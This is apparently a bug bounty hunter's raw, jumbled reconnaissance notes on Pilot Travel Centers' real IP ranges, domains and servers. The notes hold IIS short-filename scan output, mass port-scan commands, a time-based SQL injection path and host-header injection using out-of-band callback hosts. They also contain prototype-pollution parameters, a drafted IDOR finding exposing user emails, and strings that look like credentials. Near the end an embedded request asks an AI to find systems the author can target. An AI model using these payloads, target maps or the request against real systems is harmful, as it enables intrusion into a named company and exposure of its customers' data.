@@ -1,0 +1,4215 @@
+AS14556	ASN	Pilot Travel Centers, LLCcidrs_65.196.143.0/24
+70.159.149.0/24
+74.114.188.0/24
+74.114.189.0/24
+74.114.190.0/24
+_Scope:*.pilottravelcenters.com
+*.pilotflyingj.com	
+*.rvpluscard.com
+*.pilotcloud.net	
+*.greenamericabiofuels.com	
+*.pilotcompany.com	
+*.saratogarack.com	Customer Portal	
+Prime Parking
+com.pilottravelcenters.mypilot	Android.apkshodan_org:"Pilot Travel Centers  LLC"200 OK url https://www.shodan.io/search?query=ssl.cert.subject.cn%3Apilotcloud.net+200+OK
+https://www.shodan.io/search?query=ssl.cert.subject.cn%3Apilotcloud.net+200+OK_root@nsr3b:~# shortscan https://ids.rsga.pilotcloud.net
+ Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark════════════════════════════════════════════════════════════════════════════════
+URL: https://ids.rsga.pilotcloud.net/
+Running: Microsoft-IIS/10.0
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+NWEBSE1             NWEBSE?             NWEBSECCONFIG
+APP_TH1             APP_TH?
+WEB1.CON            WEB.CON?
+RESOUR1             RESOUR?             .RESOURCES
+IDEA1.ASP           IDEA.ASP?
+ERROR1.HTM          ERROR.HTM?          ERROR.HTML
+ERROR1.ASP          ERROR.ASP? 
+IDEASU1.ASP         IDEASU?.ASP? 
+PRECOM1.CON         PRECOM?.CON? 
+REPORT1.ASP         REPORT?.ASP?        REPORTVIEWERWEBFORM.ASPX
+HEALTH1.ASP         HEALTH?.ASP?        HEALTHE-SHIELD.ASP
+REPORT2.ASP         REPORT?.ASP?        REPORTSTATUS.ASPX
+EMPLOY1.ASP         EMPLOY?.ASP?        EMPLOYEEMANAGEMENT.ASPX
+DEFAUL1.ASP         DEFAUL?.ASP?        DEFAULT_COPY%282%29.ASP
+PACKAG~1.CON         PACKAG?.CON? 
+════════════════════════════════════════════════════════════════════════════════Finished! Requests: 2052; Retries: 0; Sent 413496 bytes; Received 2800915 byteshttps://ids.rsga.pilotcloud.net/EMPLOYEEMANAGEMENT.ASPXTO_LOOK_MOREhttps://api.cp.pilotflyingj.com/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/content/FUZZhttps://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/content/blog?query=&
+X-Forwarded-Host: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fun
+X-Host: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fun
+X-Forwarded-Server: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fundo google dork and github dork for urls
+
+swagger-apihttps://digital-qa-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.js
+https://digital-dev-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.js
+https://digital-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.jsdo sub_brute*.rightangle.private.pilotcloud.net
+*.workflowengine-qa.trips.pilotcloud.net	https://74.114.188.161/ASPNET_CLIENT/system_web/2_0_50727/
+https://74.114.188.161/ASPNET_CLIENT/SYSTEM_WEB/4_0_30319/
+https://74.114.188.161/commonfiles/OFFLINeimages/APP_OFFLINE.HTMFUELPA1             FUELPA?
+FUELPR1             FUELPR?
+RATEPF1             RATEPF?
+WEB1.CON            WEB.CON?
+RETALI1             RETALI?
+EFORMS1             EFORMS?
+EVENTR1             EVENTR?
+RETAIL1             RETAIL?
+EXE13B1             EXE13B?
+EXB78E1             EXB78E?
+EXTRAN1             EXTRAN?
+EX42131             EX4213?
+PFJDOC1             PFJDOC?
+PHILAN1             PHILAN?
+VENDOR2             VENDOR?
+BIODIE1             BIODIE?
+BLUEBE1             BLUEBE?
+FUELPA4             FUELPA?
+FUELPA3             FUELPA?
+FUELPA2             FUELPA?
+DFSRPR1             DFSRPR?
+VENDOR1             VENDOR?    DOWN_F1.JPG         DOWN_F?.JPG? 
+EMPLOY1             EMPLOY?
+SURVEY1             SURVEY?
+ASPNET1             ASPNET?             https://74.114.188.161/aspnet_client
+COMMON1             COMMON?             https://74.114.188.161/commonfiles
+EXTERN3             EXTERN?
+EXTERN1             EXTERN?
+EXTERN2             EXTERN?
+EXTERN~4             EXTERN?    https://74.114.188.161/VENDORApplication/
+https://74.114.188.161/VENDORportal/URL: https://74.114.188.161/SURVEYexternal/
+Running: Microsoft-IIS/7.5
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB1.CON            WEB.CON?
+ANSWER1             ANSWER?
+OOPS1.ASP           OOPS.ASP?           OOPS.ASPX
+ANONYM1.ASP         ANONYM?.ASP? 
+SURVEY2.CSS         SURVEY?.CSS? 
+APP_OF1.HTM         APP_OF?.HTM? 
+SURVEY1.CSS         SURVEY?.CSS? 
+QUESTI1.ASC         QUESTI?.ASC? 
+SURVEY~1.ASP         SURVEY?.ASP?   |_ Identified directories: 1
+    |_ ANSWER1
+  |_ Identified files: 8
+    |_ ANONYM1.ASP
+    |_ APP_OF1.HTM
+    |_ OOPS1.ASP
+      |_ Actual file name = OOPS
+    |_ QUESTI1.ASC
+    |_ SURVEY1.ASP
+    |_ SURVEY1.CSS
+    |_ SURVEY2.CSS
+    |_ WEB~1.CONhttps://74.114.188.161/SURVEYexternal/OOPS.ASPX  |_ Identified directories: 29
+    |_ ASPNET1
+    |_ BIODIE1
+    |_ BLUEBE1
+    |_ COMMON1
+    |_ DFSRPR1
+    |_ EFORMS1
+    |_ EMPLOY1
+    |_ EVENTR1
+    |_ EX42131
+    |_ EXB78E1
+    |_ EXE13B1
+    |_ EXTERN1
+    |_ EXTERN2
+    |_ EXTERN3
+    |_ EXTERN4
+    |_ EXTRAN1
+    |_ FUELPA1
+    |_ FUELPA2
+    |_ FUELPA3
+    |_ FUELPA4
+    |_ FUELPR1
+    |_ PFJDOC1
+    |_ PHILAN1
+    |_ RATEPF1
+    |_ RETAIL1
+    |_ RETALI1
+    |_ SURVEY1
+    |_ VENDOR1
+    |_ VENDOR~2https://74.114.188.161/VENDORportal/PROPERTIES/DATASOURCES/SYSTEMS.DATGET /pfj-loyaltymkt-one9-website-e'(selectfrom(select(sleep(20)))a)'/ HTTP/1.1
+Host: api.cp.pilotflyingj.com
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="114", "Chromium";v="114"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0https://fuel.pilottravelcenters.com/
+
+                        PEGASU~1.20
+                        PEGASU~1.202
+
+try to find this file by ffufing/Pegasus2%20Sentinel2/
+/Pegasus2
+/PEGASUS_
+/10.20.202ffuf with _ and .https://fuel.pilottravelcenters.com/ASPNET_CLIENT/system_web/2_0_50727/
+https://fuel.pilottravelcenters.com/ASPNET_CLIENT/system_web/4_0_30319/https://github.com/dwyl/english-wordsp/App_Scripts/MicrosoftAjax.js
+p/App_Scripts/wacairspaceanimationlibrary.js
+App_Scripts/MicrosoftAjax.js
+App_Scripts/wacairspaceanimationlibrary.js
+MicrosoftAjax.js
+wacairspaceanimationlibrary.jsmore https://officeonline.pilottravelcenters.com/p/RESOURCES/google chatgpt github twiteerURL: https://officeonline.pilottravelcenters.com/p/CLIENTBIN/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+MICROS1.XAP         MICROS?.XAP? 
+MICROS2.XAP         MICROS?.XAP? https://officeonline.pilottravelcenters.com/p/ |_ Identified directories: 8
+    |_ APP_BR1
+    |_ APP_SC1 app_scripts
+    |_ CLIENT1 clientbin
+    |_ PPTRES1 pptresources
+    |_ PPTSCR1 pptscripts
+    |_ PPTSTA1
+    |_ PPTTEM1
+    |_ RESOUR1 resourceshttps://extranet.pilottravelcenters.com/BioDieselExternalMaintenance/backup/https://extranet.pilottravelcenters.com/BioDieselExternalMaintenance/https://extranet.pilottravelcenters.com/VendorPortal/WebResource.axd?d=2D8um6hCzDf4buMyKAP_QMDhhEhf_2v75GtGSg0dHLcwy55GumzsWQPvpc0WwQaFE9LmBBQaBubaMliD6IgZI6pyD63AU39wEojaauSWwxM1bt7qu'-ffuf-'j3wrr&t=637811441240000000if somebody says that something is impossible and it's not buypassible we are hackers and we always find a path to do thingsThese blackbox regular expression testing is still not very touched I keep finding all these issues when I go to live hacking events it's it's always thereIf something is being validated and you can bypass it think about the impact and you'll see the big picture"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"Buypass methidshttps://github.com/filedescriptor/Unicode-Mapping-on-Domain-names34 M Wordlist Subdomain Brute-Force
+Full Subdomain Enumeration
+Levels-deep Subdomain EnumerationAllforone
+reconftw.sh
+awscert.shhttp://nationalpizzamonth.pilotflyingj.com/Frist Target  74.114.190.0/24  aalias 5_cidr74.114.190.25    test-okcvpn.pilotflyingj.com.
+74.114.190.214   mail12.pilottravelcenters.com.
+74.114.190.248   dns3.pilotcorp.com.
+74.114.190.249   dns4.pilotcorp.com.74.114.190.89:443  Citrix Gateway
+https://74.114.190.89/logon/LogonPoint/tmindex.htmlCitrix Gateway
+haw to find vershion https://github.com/fox-it/citrix-netscaler-triage
+look for do file on linkfindr on burp open all js filehttps://74.114.190.89/nf/auth/doNegotiate.doSecond Target 74.114.189.0/24prips 74.114.189.0/24 |  hakrevdns74.114.189.55    as2.pilottravelcenters.com.
+74.114.189.73    mobileapps.pilotflyingj.com.
+74.114.189.73    pilot-flyingj.com.
+74.114.189.73    www.pilot-flyingj.com.
+74.114.189.73    reserve.pilotflyingj.com.
+74.114.189.73    myrewards-qa.pilotflyingj.com.
+74.114.189.73    pilottravelcenters-qa.pilotflyingj.com.
+74.114.189.73    www.pilotsurveys.com.
+74.114.189.73    pilotsurveys.com.
+74.114.189.73    www.pfjfeedback.com.
+74.114.189.73    pfjfeedback.com.
+74.114.189.73    portal-test.pilotflyingj.com.
+74.114.189.86    extranet.pilotflyingj.com.
+74.114.189.130   travelwell.pilotflyingj.com.
+74.114.189.130   rebateeducation.pilotflyingj.com.
+74.114.189.130   www.rebateeducation.pilotflyingj.com.
+74.114.189.150   connect4.pilottravelcenters.com.
+74.114.189.250   connect2.pilottravelcenters.com.shodan.74.114.189.73
+mobileapps.pilotflyingj.com
+www.pilotsurveys.com
+myrewards-qa.pilotflyingj.com
+pilotflyingj.com
+portal-test.pilotflyingj.com74.114.189.130
+travelwell.pilotflyingj.com
+rebateeducation.pilotflyingj.com
+www.rebateeducation.pilotflyingj.com74.114.189.73
+mobileapps.pilotflyingj.com
+pilot-flyingj.com
+www.pilot-flyingj.com
+reserve.pilotflyingj.com
+myrewards-qa.pilotflyingj.com74.114.189.55
+as2.pilottravelcenters.comnaabu -host 74.114.189.0/24  -top-ports 100074.114.189.73:443
+74.114.189.55:5080
+74.114.189.130:80
+74.114.189.130:443
+74.114.189.73:80
+74.114.189.55:443masscan 74.114.189.0/24 --ports 0-65535 --rate=100000 -oX 4_cidr_massful.xmlGET http://7ea135aefd204f3b87-ke2revwibc6msuregzkqh8b5owumib.oastify.com HTTP/1.1
+Host: loyaltyportal.pilotflyingj.com
+Accept-Encoding: gzip, deflate, br
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0http://myrewards.pilotflyingj.com/?utm_source=landing%20page&utm_medium=landing%20page&utm_campaign=shower%20power
+http://nationalpizzamonth.pilotflyingj.com/?amp;utm_campaign=NTLPizza&utm_medium=Social&utm_term=2.6.17&utm_content=ProDriverFlight1
+http://nationalpizzamonth.pilotflyingj.com/?utm_campaign=NTLPizza&utm_medium=Social&utm_term=2.6.17&utm_content=ProDriverFlight1
+http://nationalpizzamonth.pilotflyingj.com/?utm_source=Facebook&utm_campaign=NTLPizza&utm_medium=Social&utm_term=2.6.17&utm_content=ProDriverFlight1http://pilotflyingj.com/?utm_campaign=Driver View&utm_source=hs_automation&utm_medium=email&utm_content=13247573&_hsenc=p2ANqtz--8l-XJvpEhR8xwtAgfJQzbkOwVAefC9-FIi7QEqBmtkymre4MBltFdy10-IQCUJAronnCA20cjMMQ-ElOd5NWQ4oDXMA&_hsmi=13247573http://pilotflyingj.com/food?utm_campaign=Food+%26+Beverage&utm_source=hs_email&utm_medium=email&utm_content=16704398&_hsenc=p2ANqtz--HVsurUfHXFLZkUicpoqroC81_7lHywG0LEoKS5k9cSun6QUyA2cPFARdRJ5qWwuJoAAYBtgxL6W1dStMHjIdAP6Lkzg&_hsmi=16704398
+http://pilotflyingj.com/national-coffee-day?utm_campaign=Coffee&utm_content=8468452&utm_medium=social&utm_source=twitter
+http://pilotflyingj.com/national-coffee-day?utm_campaign=Coffee&utm_source=hs_email&utm_medium=email&utm_content=14289678&_hsenc=p2ANqtz--nzFH34ux9roEB3iBGKFL7YjmJVtMsST-P7IRqMh9z6LN8vPfmMGFePW0of0bZ6USstZSiJBteudMSWB7msmMeBA0wnw&_hsmi=14289678
+http://pilotflyingj.com/philmor?utm_source=redirect&utm_medium=redirect&utm_term=philmormug&utm_content=philmor&utm_campaign=myphilmordotcom/robots.txt
+http://reserve.pilotflyingj.com/Location/Details/1171?utm_source=Pilot&utm_medium=YextLocationsPageshttps://jobs.pilotflyingj.com/?utm_source=pilot&utm_medium=YextLocationsBlock&utm_campaign=recruitmenthttps://locations.pilotflyingj.com/us/oh/toledo/5820-hagman-road?utm_source=Pilot&utm_medium=YextAlertBanner&utm_campaign=LaneClosures
+https://loyaltyportal.pilotflyingj.com/myrewards/confirmation?token=1V_tJgGvHMjbhDdZJZ2i0AFywOzVgo5RvJRxwNHxSnmB&_branch_match_id=1306343452090145625&utm_medium=marketing&_branch_referrer=H4sIAAAAAAAAA8soKSkottLXL8jMyS9Jy6nMzEvP0kssKNDLyczL1g8N8cs2DM8MDA61L8nPTs2zNQyLL%2FFKdy%2Fz8M1KynBJifKKMso0cHSrLPevCkvPNw0q8wqqKPfzqAjOy3UCAKppM4FbAAAAhttps://www.pilotflyingj.com/fleet/?gclid=CjwKCAjw27jnBRBuEiwAdjQXDKa88lGoLX9TsMN-1hFXB4HIlIdYONa_sd8uRLLXfZY3MCpW2Dns0xoCqIwQAvD_BwEhttps://videorequests.pilotflyingj.com/servlet/servlet.ImageServer?id=0153c000004TP9N&oid=00D80000000bzL1&lastMod=1602444230000https://videorequests.pilotflyingj.com/s/sfsites/l/%7B%22mode%22%3A%22PROD%22%2C%22cac%22%3A0%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22fwuid%22%3A%22ZDROWDdLOGtXcTZqSWZiU19ZaDJFdzk4bkk0bVJhZGJCWE9mUC1IZXZRbmcyNDguMTAuNS01LjAuMTA%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%22CMiYVlPW6pOgNvM9UnJGCw%22%7D%2C%22apce%22%3A1%2C%22apck%22%3A%22JHt0aW1lc3RhbXB9MDAwMDAwMDAwMDBlbl9VUw%22%2C%22mlr%22%3A1%2C%22pathPrefix%22%3A%22%22%2C%22dns%22%3A%22c%22%2C%22ls%22%3A1%2C%22lrmc%22%3A%22-386269907%22%7D/bootstrap.js?aura.attributes=%7B%22ac%22%3A%22%22%2C%22authenticated%22%3A%22false%22%2C%22brandingSetId%22%3A%2293b8bb8e-a48f-4ca0-b591-b37ee1e27633%22%2C%22formFactor%22%3A%22LARGE%22%2C%22isHybrid%22%3A%22false%22%2C%22language%22%3A%22en_US%22%2C%22pageId%22%3A%220f5f1962-5c39-4a48-b964-2edf8b3068f3%22%2C%22publishedChangelistNum%22%3A%2231%22%2C%22schema%22%3A%22Published%22%2C%22themeLayoutType%22%3A%22Login%22%2C%22uds%22%3A%22false%22%2C%22viewType%22%3A%22Published%22%7Dhttps://videorequests.pilotflyingj.com/s/sfsites/l/%7B%22mode%22%3A%22PROD%22%2C%22cac%22%3A0%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22fwuid%22%3A%22ZDROWDdLOGtXcTZqSWZiU19ZaDJFdzk4bkk0bVJhZGJCWE9mUC1IZXZRbmcyNDguMTAuNS01LjAuMTA%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%22CMiYVlPW6pOgNvM9UnJGCw%22%7D%2C%22apce%22%3A1%2C%22apck%22%3A%22JHt0aW1lc3RhbXB9MDAwMDAwMDAwMDBlbl9VUw%22%2C%22mlr%22%3A1%2C%22pathPrefix%22%3A%22%22%2C%22dns%22%3A%22c%22%2C%22ls%22%3A1%2C%22lrmc%22%3A%22-386269907%22%7D/resources.js?pv=1716476882000107833704&rv=1716613992000https://videorequests.pilotflyingj.com/s/login?ec=302&inst=8a&startURL=%2Fcontenthub%2F
+https://recover.pilotflyingj.com/showLogin.cc?constructor%5Bprototype%5D%5Ba42e5579%5D=yf2xy3x9&constructor.prototype.b1a3fd5b=yf2xy3x9&__proto__.ccd80966=yf2xy3x9&__proto__%5Bdcb52823%5D=yf2xy3x9https://privacy.pilotflyingj.com/s/sfsites/aura?r=2&aura.Component.getComponent=1&ui-communities-components-aura-components-forceCommunity-navigationMenu.NavigationMenuDataProvider.getNavigationMenu=1&ui-communities-components-aura-components-forceCommunity-richText.RichText.getParsedRichTextValue=2&ui-force-components-controllers-hostConfig.HostConfig.getConfigData=1&ui-self-service-components-profileMenu.ProfileMenu.getProfileMenuResponse=1https://jobs.pilotflyingj.com/travel-center-jobs?custom_categories=Travel+Center+Jobs&location_city=Rawlins&location_state=Wyoming&page_number=1&page_size=50&sort_by=headline&sort_order=ASC
+http://blog.pilotflyingj.com/wp-json/swp_api/search?s=
+http://hubspot.pilotflyingj.com/travel-guide?portalId=339778&hsFormKey=12fdc54461cbe7a499d4479c41df20c3
+http://jobs.pilotflyingj.com/?debug=3e4edc5e4ade7278ed750502bde7eb65c16e037d
+http://jobs.pilotflyingj.com/ajax/click/track/insert/?FK1=5394107&EventID=9&EventData=&JobSource=https://loyaltyportal.pilotflyingj.com/myrewards/registrationFor this vulnerability, just type shodan title:"Check Point" ssl:"target"elati
+handru#5g/GGgd0xxsamindunm#FU57/EVGss#FU57/EVGssTO_DOmanual test main appwith main app coockis try to acsees some 403 domains`https://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=9d75393b322866e96cbca414b08a5df338eb7c6b4b2089c1b7a7061cff8eb296230ab9a5c73ee57fbf9b08964019027375695b49906ce97a61f9eb21865ebdd36c2886e2e1c1f4cb`
+https://click.newsletter.pilotflyingj.com/?qs=320d4bf731b62d67eb49c76ea88060e56a2cfd6ce4c00278c28ce93e5b3f05a14db028abb5b4b147c0b1236b64feb3d94ba43669b13c6a94`
+https://click.newsletter.pilotflyingj.com/unsub_center.aspx?qs=9d75393b322866e96cbca414b08a5df338eb7c6b4b2089c1b7a7061cff8eb296230ab9a5c73ee57fbf9b08964019027375695b49906ce97a61f9eb21865ebdd36c2886e2e1c1f4cbhttps://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=1dc2722a7323d1d4e416926bf5937d9ca98eaa458be4ab6deb358b3cf188384095846de4f9ce728d025d72951726f5477e4c25237bab05e82d0d9c38f103cd75cf4a0bae2eecda19
+`
+https://click.newsletter.pilotflyingj.com/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspxhttps://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=8e3df73589d740edde7cbdf50c81385b47136b62c928c1eebd967f13284f2c5fbb71c648452d73afd7ecf934572e0fb99603bc48f3f60a7dc95d0cf8b674fef3392ab178308c12a4http://click.newsletter.pilotflyingj.com/?qs=50ef32ecd79a805644f7feb734d1f28e464170b5e1f70fbf285650264b3b018ce1e8090fc9c8ea3a7eed468c895e84865ffd161c4cb70e8chttp://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=f1e6a4e46b0a9dbca914224fdb7b19ba40667d1cc939366bb2f93b963a965eaef6e80506142ec0381a9a8c03804a1f1d915914d873ab311b4341f727d3f9d13886ef400b9acd8918http://click.newsletter.pilotflyingj.com/open.aspx?d=70176&bmt=0http://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=f7715753beb0210a4811e1995f50acb935e7f8df86478b66a7149690c82621eafe6455935f0d8dd533ff90f72b45bcbfdb02788de9e80a1bdb8705580b2d42c3f5524e096585fd7fhttp://click.newsletter.pilotflyingj.com/unsub_center.aspx?qs=277ee25b29247cc61dc79736f775f0a3bcba4519a8afc4524f63ddbf1bd9758689731db0d5fc26228a9ef3127cb1d5b4e6adf3f5460e59cbfe42c6f554ce756283bec9178518f796http://click.newsletter.pilotflyingj.com/?qs=02e72b733a178a3ce815ef072ddaae5d05e37eb1b33aeb8108085dd28fce56280718f1e0cdb6b0a735533c3524014f9c2279e549afc76c4chttp://click.newsletter.pilotflyingj.com/?qs=02e72b733a178a3ce815ef072ddaae5d05e37eb1b33aeb8108085dd28fce56280718f1e0cdb6b0a735533c3524014f9c2279e549afc76c4chttps://click.newsletter.pilotflyingj.com/subscription_center.aspxhttp://click.newsletter.pilotflyingj.com/robots.txt
+https://click.newsletter.pilotflyingj.com/?qs=bd3f0f884387ac13ef70073a3f28927eed0926e49262f91b8b16850dbb6095e96b22d04eac8f0ccad5cce601bd097dc6abc776824cde1ce3https://click.newsletter.pilotflyingj.com/?qs=ad7e473844e565b3c54ca414ff27cbb9c402b873e44c60866b46d59af394abd622e96dcee1a719074b5f1245e503633788aef36eef86f7dchttps://click.newsletter.pilotflyingj.com/?qs=be4c0d84eb65cb5c498df921cc38ac3d3dea5e0f0e673e341199a079090151336c7c8af59f18f04aa79984996e759fdf1ec45ebe9a0e975ehttps://click.newsletter.pilotflyingj.com/?qs=1ec480304b6bbb9391a94c5127b08c0f2ab309cc79b7c7a475064ec27b8d51788c8c61c99655c5ef46ce3842097a549b5073f8a33b8e63e4
+https://click.newsletter.pilotflyingj.com/robots.txt
+http://click.newsletter.pilotflyingj.com/
+https://click.newsletter.pilotflyingj.com/?qs=3289a39402197499089f7a7fb350b3881603cea970b85f80a5df1b4d65b5aa47a2e250c23ae644eecffcb27a258b4611f1cac4a13a237109
+https://click.newsletter.pilotflyingj.com/?qs=0324ac5eae1eaabf208c20c0fb50541fbd2e22fdea027c468cc4ae1e6836e58cf577131ad2504ca3436f1fabb53ba6af23686c11dc93627dwork finehttps://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=1dc2722a7323d1d4e416926bf5937d9ca98eaa458be4ab6deb358b3cf188384095846de4f9ce728d025d72951726f5477e4c25237bab05e82d0d9c38f103cd75cf4a0bae2eecda19https://click.newsletter.pilotflyingj.com/unsub_center.aspx?qs=9d75393b322866e96cbca414b08a5df338eb7c6b4b2089c1b7a7061cff8eb296230ab9a5c73ee57fbf9b08964019027375695b49906ce97a61f9eb21865ebdd36c2886e2e1c1f4cbhttps://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=8e3df73589d740edde7cbdf50c81385b47136b62c928c1eebd967f13284f2c5fbb71c648452d73afd7ecf934572e0fb99603bc48f3f60a7dc95d0cf8b674fef3392ab178308c12a4see user Email Address: 
+Update use details
+Unsubscribe to newsalrethttps://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=8e3df73589d740edde7cbdf50c81385b47136b62c928c1eebd967f13284f2c5fbb71c648452d73afd7ecf934572e0fb99603bc48f3f60a7dc95d0cf8b674fef3392ab178308c12a4https://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=1dc2722a7323d1d4e416926bf5937d9ca98eaa458be4ab6deb358b3cf188384095846de4f9ce728d025d72951726f5477e4c25237bab05e82d0d9c38f103cd75cf4a0bae2eecda19https://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=9d75393b322866e96cbca414b08a5df338eb7c6b4b2089c1b7a7061cff8eb296230ab9a5c73ee57fbf9b08964019027375695b49906ce97a61f9eb21865ebdd36c2886e2e1c1f4cbIDOR on click.newsletter.pilotflyingj.com Allows Unauthenticated Attackers to View User Emails, Modify Profiles, and Change News Subscription PreferencesI discovered an Insecure Direct Object Reference (IDOR) vulnerability on the https://click.newsletter.pilotflyingj.com/profile_center.aspx?qs= URL. The qs= parameter is used to identify users, but there is no authentication mechanism to verify the user. This allows unauthenticated attackers to access user profiles, modify user details, change news subscription preferences, and view user details email,+.. .https://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=
+https://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=I discovered an Insecure Direct Object Reference (IDOR) vulnerability on https://click.newsletter.pilotflyingj.com. The qs parameter is used to identify users, but there is no authentication mechanism to verify the user. This allows unauthenticated attackers to access user profiles, modify user details, change news subscription preferences, and view user email addresses.valid_value1
+valid_value2
+valid_value3GET /pfj-loyaltymkt-one9-website-e*/ HTTP/1.1
+Host: api.cp.pilotflyingj.com
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="114", "Chromium";v="114"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0python3.9 -m venv env
+elit7b@7b:~$ source env/bin/activate   this is my another target im doing bug bounty and this is some of my note analise them nd undestnd bout target and scope domin root domain and find ll avalible domain nd active domain do google ducdcuck go bing yahoo dork for this scope target find all avalbible pablick acsseble endpoint aall of them and find all search engine indexsed urls and wybackmacine url and any urls that can found on ;all overiternet find any all pablic acsseble api endpoint and other pblick end point think out side of bod use dork keyword to find out of target domain taget own document fnd ll infromation discose vunarability and find all end point nd analise them for any aacssescontrol issus any endpoint that can acses without utuintictonanddiscole someinfo find any possible api endpoit i fond like 10 issus on this target most of them are misconfigaralion acsees control issus nd infrogtion discole api ewithout utntication so lot of the is selfcoreppliction find every website build tecnology nd find any cokmm misconfigration that has inmy target go so deeep like you cant miss nything use veery osint reon bugbounty tecnise tht can help i have full permissio n souse it do it find likend menebr work in thiscompy and use ther name to find ny pcompany profile nd find any discose vunaability i attarch ipnamp scn file of cidr ranse analise them for any vunrability system that i cna target and find vunrabilitymisconfgarationesayly https://bcp.pilotcompany.com/api/merchantdropdown
+https://edocs.pilotcompany.com/DiscoveryService?entityID=https://edocs.pilotcompany.com/Saml2&return=FFUF
+https://pilotco.pilotcompany.com/s/contentdocument/0692T00000DYA8sQAH https://fuel.pilottravelcenters.com [503]
+https://officeonline.pilottravelcenters.com [404]
+https://pilottravelcenters.com/JScripts/preloadImages.js [200]
+https://securemail.pilottravelcenters.com [403]
+https://spamdigest.pilottravelcenters.com [403]
+https://recruitment.pilottravelcenters.com [200]
+https://www.fuel.pilottravelcenters.com [503]
+https://www.pilottravelcenters.com/JScripts/preloadImages.js [200]
+https://fuel.pilottravelcenters.com/ [503]
+https://pilottravelcenters.com/vrmobile/ [200]
+https://recruitment.pilottravelcenters.com/ [200]
+https://www.fuel.pilottravelcenters.com/ [503]
+https://pilottravelcenters.com/vrmobile/default.aspx [200]
+https://www.pilottravelcenters.com/JScripts/preloadImages.js [200]https://www.pilottravelcenters.com/VRMobile
+https://mail.pilottravelcenters.com/owa/auth/logon.aspx?url=https%3a%2f%2fmail.pilottravelcenters.com%2fowa&reason=0
+https://webmail.pilottravelcenters.com/owa/auth/logon.aspx?url=https%3a%2f%2fwebmail.pilottravelcenters.com%2fowa&reason=0
+https://autodiscover.pilottravelcenters.com/owa/auth/logon.aspx?url=https%3a%2f%2fautodiscover.pilottravelcenters.com%2fowa&reason=0https://spamdigest.pilottravelcenters.com/securereader/init.jsf?brand=a8ccbcecheck for Java JSF ViewState (.faces) Deserialization
+3
+https://securemail.pilottravelcenters.com/securereader/init.jsf?brand=a8ccbcehttps://pilottravelcenters.com 
+https://www.pilottravelcenters.com [301]https://vr.pilottravelcenters.com [301]https://fuel.pilottravelcenters.com [503]
+https://recruitment.pilottravelcenters.com [200]
